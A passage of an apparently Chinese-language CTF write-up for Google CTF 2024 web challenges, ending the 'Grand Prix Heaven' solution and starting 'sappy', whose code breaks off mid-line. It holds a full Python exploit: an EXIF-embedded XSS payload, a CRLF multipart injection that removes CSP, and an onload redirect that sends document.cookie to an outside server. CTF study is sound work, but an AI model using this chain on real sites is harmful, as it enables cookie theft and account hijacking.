\u003ccode\u003ehttps://grandprixheaven-web.2024.ctfcompetition.com/media/\u0026lt;img-id\u0026gt;\u003c/code\u003e，這樣就成功繞過了。\u003c/p\u003e\n\u003cp\u003e因此我們的 xss url 會是 \u003ccode\u003ehttps://grandprixheaven-web.2024.ctfcompetition.com/fave/\u0026lt;car-id\u0026gt;?F1=\\media\\\u0026lt;img-id\u0026gt;\u003c/code\u003e，把這個丟 \u003ccode\u003ereport\u003c/code\u003e 就能 xss\u003c/p\u003e\n\u003cp\u003e所以整體順序是：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e先生帶 xss payload 的圖片\u003c/li\u003e\n\u003cli\u003e新增車並上傳該圖片，並且對 custom 做操作繞過檢查塞進 \u003ccode\u003emediaparser\u003c/code\u003e 且拔掉 \u003ccode\u003ecsp\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e取得車的 url\u003c/li\u003e\n\u003cli\u003e解析 json 拿到 img-id\u003c/li\u003e\n\u003cli\u003e構建 xss url\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"exploit-1\"\u003eexploit\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e PIL \u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e Image\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e piexif\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e io\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e requests\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e urllib.parse\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eurl \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;https://grandprixheaven-web.2024.ctfcompetition.com\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehttpserver \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;https://vpn.chummydns.com:20000/\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eimg \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e Image\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003enew(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;RGB\u0026#39;\u003c/span\u003e, (\u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eexif_dict \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e {\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;0th\u0026#39;\u003c/span\u003e: {\u003cspan style=\"color:#ae81ff\"\u003e270\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026lt;svg\u0026gt;\u0026lt;svg/onload=\u0026#39;window.location=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003ehttpserver\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e+document.cookie\u0026#39;\u0026gt;\u0026#34;\u003c/span\u003e}}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eexif_bytes \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e piexif\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edump(exif_dict)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebuffer \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e io\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eBytesIO()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eimg\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esave(buffer, format\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;JPEG\u0026#39;\u003c/span\u003e, exif\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eexif_bytes)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebuffer\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eseek(\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003er \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e requests\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003epost(urllib\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eparse\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eurljoin(url, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/api/new-car\u0026#39;\u003c/span\u003e), allow_redirects\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eFalse\u003c/span\u003e, files\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;image\u0026#39;\u003c/span\u003e: (\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;test.jpg\u0026#39;\u003c/span\u003e, buffer, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;image/jpeg\u0026#39;\u003c/span\u003e),\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}, data\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;year\u0026#39;\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e2004\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;make\u0026#39;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;aaa\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;model\u0026#39;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;aaa\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;custom\u0026#39;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{\u0026#34;1\u0026#34;:\u0026#34;retrieve\u0026#34;,\u0026#34;2\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\\\\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\\\\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003er\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\\\\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003en\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\\\\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003er\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\\\\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003enmediaparser\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\\\\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003er\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\\\\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003en--GP_HEAVEN\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\\\\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003er\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\\\\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003enContent-Disposition: form-data; name=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\\\\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;3\u0026#34;:\u0026#34;head_end\u0026#34;,\u0026#34;4\u0026#34;:\u0026#34;faves\u0026#34;,\u0026#34;5\u0026#34;:\u0026#34;footer\u0026#34;,\u0026#34;6\u0026#34;:\u0026#34;footer\u0026#34;,\u0026#34;0a\u0026#34;:\u0026#34;csp\u0026#34;}\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e})\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ef1url \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e urllib\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eparse\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eurlparse(urllib\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eparse\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eurljoin(url, r\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eheaders[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Location\u0026#39;\u003c/span\u003e]))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ef1path \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e f1url\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003epath\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ef1query \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e urllib\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eparse\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eparse_qs(f1url\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003equery)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003er \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e requests\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eget(urllib\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eparse\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eurljoin(url, \u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/api/get-car/\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003ef1query[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;F1\u0026#39;\u003c/span\u003e][\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e]\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eimgid \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e r\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ejson()[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;img_id\u0026#39;\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eparams \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;F1\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\\media\\\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003eimgid\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003exssurl \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003eurllib\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eparse\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eurljoin(url, f1path)\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e?\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003eurllib\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eparse\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eurlencode(params)\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003erequests\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003epost(urllib\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eparse\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eurljoin(url, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/report\u0026#34;\u003c/span\u003e), data\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;url\u0026#39;\u003c/span\u003e: xssurl\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e})\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"flag-1\"\u003eFlag\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/306d7180-00af-452e-a4dd-d959b8562b4c\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eCTF{Car_go_FAST_hEART_Go_FASTER!!!}\u003c/code\u003e\u003c/p\u003e\n\u003ch2 id=\"sappy\"\u003esappy\u003c/h2\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/945b7796-12ab-41ea-9301-994ea869a81f\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch3 id=\"概述-2\"\u003e概述\u003c/h3\u003e\n\u003cp\u003e這題網站長這樣\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/2304d75c-2581-4bed-916e-af192c608def\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e這四個按鈕會分別顯示個別設定好的 html\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/0a16eee7-b24a-438d-854f-e6968be8b914\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e下面 share 則是傳遞任意網址他們的 bot 就會去瀏覽那個網址\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/19ff9088-666b-4b7a-984d-bbe035be8df5\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e看到這裡應該可以猜到又是 XSS\u003c/p\u003e\n\u003cp\u003e來看一下前端 html \u003ccode\u003eindeex.html\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-html\" data-lang=\"html\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u0026lt;\u003cspan style=\"color:#f92672\"\u003ep\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        Hi! I\u0026#39;m a beginner in programming and this is my first application,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        called SAPPY! I\u0026#39;m sharing here some quirks I learnt about JavaScript.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        Use the buttons below to find out!\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u0026lt;/\u003cspan style=\"color:#f92672\"\u003ep\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eid\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;pages\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;row flex-center\u0026#34;\u003c/span\u003e\u0026gt;\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u0026lt;\u003cspan style=\"color:#f92672\"\u003eiframe\u003c/span\u003e\u0026gt;\u0026lt;/\u003cspan style=\"color:#f92672\"\u003eiframe\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-js\" data-lang=\"js\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eiframe\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e document.\u003cspan style=\"color:#a6e22e\"\u003equerySelector\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;iframe\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eonIframeLoad\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003eiframe\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003econtentWindow\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003epostMessage\u003c/span\u003e(\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#e6db74\"\u003e`\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e            {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e                \u0026#34;method\u0026#34;: \u0026#34;initialize\u0026#34;, \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e                \u0026#34;host\u0026#34;: \u0026#34;https://sappy-web.2024.ctfcompetition.com\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e            }`\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          window.\u003cspan style=\"color:#a6e22e\"\u003eorigin\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        );\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#a6e22e\"\u003eiframe\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003esrc\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;./sap.html\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#a6e22e\"\u003eiframe\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eaddEventListener\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;load\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eonIframeLoad\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e//.............\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e      \u003cspan style=\"color:#a6e22e\"\u003efetch\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;pages.json\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        .\u003cspan style=\"color:#a6e22e\"\u003ethen\u003c/span\u003e((\u003cspan style=\"color:#a6e22e\"\u003er\u003c/span\u003e) =\u0026gt; \u003cspan style=\"color:#a6e22e\"\u003er\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ejson\u003c/span\u003e())\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        .\u003cspan style=\"color:#a6e22e\"\u003ethen\u003c/span\u003e((\u003cspan style=\"color:#a6e22e\"\u003ejson\u003c/span\u003e) =\u0026gt; {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e (\u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e [\u003cspan style=\"color:#a6e22e\"\u003eid\u003c/span\u003e, { \u003cspan style=\"color:#a6e22e\"\u003etitle\u003c/span\u003e }] \u003cspan style=\"color:#66d9ef\"\u003eof\u003c/span\u003e Object.\u003cspan style=\"color:#a6e22e\"\u003eentries\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ejson\u003c/span\u003e)) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ebutton\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e document.\u003cspan style=\"color:#a6e22e\"\u003ecreateElement\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;button\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#a6e22e\"\u003ebutton\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003esetAttribute\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;class\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;margin\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#a6e22e\"\u003ebutton\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003einnerText\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etitle\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#a6e22e\"\u003ebutton\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eaddEventListener\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;click\u0026#34;\u003c/span\u003e, () =\u0026gt; \u003cspan style=\"color:#a6e22e\"\u003eswitchPage\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eid\u003c/span\u003e));\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#a6e22e\"\u003edivPages\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eappend\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ebutton\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        });\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eswitchPage\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eid\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emsg\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e 